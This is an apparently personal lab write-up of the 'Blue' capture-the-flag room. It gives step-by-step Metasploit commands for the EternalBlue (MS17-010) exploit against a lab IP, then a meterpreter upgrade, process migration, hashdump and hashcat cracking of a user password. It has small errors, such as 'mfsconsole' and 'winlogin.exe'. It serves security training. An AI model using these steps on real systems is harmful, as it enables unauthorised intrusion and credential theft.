@@ -1,0 +1,127 @@
+Blue - CTF 14/6/2020
+
+Firstly reconnasance is done using nmap, finding out data about our target machine.
+
+Command: nmap -sV -sC -oN nmap/initial 10.10.191.91
+-sV searches for version numbers of any services running
+-oN to output to a file (file called initial in this case)
+-sC uses default scripts for nmap.
+This room is specifically about the EternalBlue exploit that was used for the major ransonware known as WannaCry.
+This is done using a bug in the SMB server found by the CIA, but later found out by a hacker hacking into the CIA.
+Since this uses a bug in the SMB Server, instead of using the default scripts -sC, a script like smb* can be used. ex:"--script=smb*".
+This will go through all the the scripts within the system to find vulnerbilities within that given script. These scripts can be found in /usr/share/nmap/scripts in kali linux
+
+As mentioned before this room is based about the EternalBlue exploit. This machine is vulnerable to this exploit named ms17-010
+
+The results of this scan can be found in nmap/initial as previously mentioned and this shows that there is only 3 services running under the port number 1000.
+
+
+Secondly, and most importantly this exploit is done using the framework know as Metasploit.
+
+An introdution to metasploit.
+It is a very powerful tool used by both Whitehat and BlackHat hackers to probe systematic vulnerabilities on networks and servers. It includes more than 1960 exploits over 25 platforms, including Android, PHP, Java, Python etc. 
+It carries nearly 550 payloads of which include:
+1. Command shell payloads that enable users to run scripts or random commands against a host
+2. Dynamic payloads that allow testers to generate unique payloads to evade antivirus software
+3. Meterpreter payloads that allow users to commandeer device monitors using VMC and to take over sessions or upload and download files
+4. Static payloads that enable port forwarding and communications between networks
+
+All you need to use Metasploit once it’s installed is to obtain information about the target either through port scanning, OS fingerprinting or using a vulnerability scanner to find a way into the network. Then, it’s just a simple matter of selecting an exploit and your payload. In this context, an exploit is a means of identifying a weakness in your choice of increasingly harder to defend networks or system and taking advantage of that flaw to gain entry.
+
+With all of this being said, more information will be availible in the Metasploit Room which will be completed in the future.
+
+To open metasploit type "mfsconsole" in the terminal. Installed by default in kali. (If its not installed on your device, please install first)
+
+After metasploit runs, search for the exploit, mentioned above. The command to find is "search <name of exploit>" The name of exploit can be its CVE number, or MS number or even the name of the exploit itself. So to find this exploit either one of the commands will work:
+search CVE-2017-0144
+search ms17-010
+search Eternalblue
+
+After this command, the results would be like this:
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+   1  exploit/windows/smb/doublepulsar_rce           2017-04-14       great    Yes    DOUBLEPULSAR Payload Execution and Neutralization
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+
+From the following exploits we will need to select one. For this room we will be choosing exploit #2.
+
+The command to select the exploit is "use <exploit path>"
+
+
+After selecting the exploit, running the command "show options" will show if any required fields. The result of this search will be:
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+As you can see from the Module options, there is one required field which is blank. It requires the IP of the remote host (device which we are trying to exploit).
+
+To set this the syntax will be set RHOSTS 10.10.191.91
+
+After this runnning "show options" will show the IP entered in to the relevant field.
+
+When all is set, executing the command "run exploit" will run the exploit on the target machine, and it is as simple as that.
+
+Now when it done, it will spawn a shell in the remote host, which now gives you full access to the machine.
+
+We now have a normal shell, but we are required to upgrade it into a meterpreter shell. To move the current shell to the background, we can run the "background" command.
+This will store the exploited shell in the background as said inthe command, and return to the terminal of the local computer, which is running metasploit (msfconsole).
+
+Typing the command "sessions" will show the active sessions, which currenlty would be the regular shell.
+
+Now to upgrade from a regular shell to a meterpreter, use the command "use shell_to_meterpreter", same thing as running it from its path ("use post/multi/manage/shell_to_meterpreter"). If you don't recollect its absolute path, the command "search meterpreter" will show anything related to meterpreter.
+
+After loading the shell_to_meterpreter module, it needs to be set to binded to a session. This can be done with sessions -u 2, or set SESSION 2. Like before with RHOSTS, there is a required field named SESSION which has to be filled.
+
+After it is set, to run meterpreter, the command "session -i 2" can be used. -i standing for interactive, and 2 is the session number.
+
+A bit about meterpreter:
+“Meterpreter is one of the flagship products in Metasploit and is leveraged as a payload after a vulnerability is exploited. A payload is the information returned to us when we trigger an exploit. For example, when we exploit a weakness in a Remote Procedure Call (RPC), trigger the exploit, and select Meterpreter as the payload, we would be given a Meterpreter shell to the system. Meterpreter is an extension of the Metasploit Framework that allows us to leverage Metasploit’s functionality and further compromise our target. Some of this functionality includes ways to cover your tracks, reside purely in memory, dump hashes, access operating systems, pivot, and much more.”
+
+With meterpreter, there are a lot of features now accessible. One being "getsystem", it attempts to elevate your priveldge to that of local system.
+
+The command "ps" will show a list of running processes. Our objective now is to migrate to another process (not sure why we are doing this but sure)
+
+While migrating, please remind to migrate to a process which has SYSTEM access, one such process is winlogin.exe. To migrate to this process the command is as following. "migrate <PID of process to which we are migrating>". In the case of our box, winlogin had a PID of 234. So the command was "migrate 234"
+
+Meterpreter also has a nice feature to dump all the hashes of the system. The command to do this is "hashdump", and then the output of this file can be stored in a hashfile, which can be then cracked.
+
+To crack this password, we will be using hashcat. The command being "hashcat --username --show -a 0 -m 1000 <path to hashfile> <path to wordlist>"
+option (--username): Enable ignoring of usernames in hashfile
+option (--show): Show cracked passwords only
+-a (attack mode): 0
+-m (hashtype): 1000
+hashfile: hashes.txt
+wordlist: /usr/share/wordlists/rockyou.txt
+
+This will output the password of Jon as : alqfna22
+
+Note: Hashcat is just one application. Applications like John The Ripper and Hydra would also do the job.
+
+Lastly, finding flags.
+This part is pretty easy as metasploit has a command like find in linux, called search. So to search a particular string, the command "search <string>" would search the current directory recursively for that particular string"
+And luckily in this box, flags are named with the prefix "flag<number>.txt", so finding this particular string is just as easy as "search flag*.txt".
+This command will list down all the paths of where the flags are.
+
+
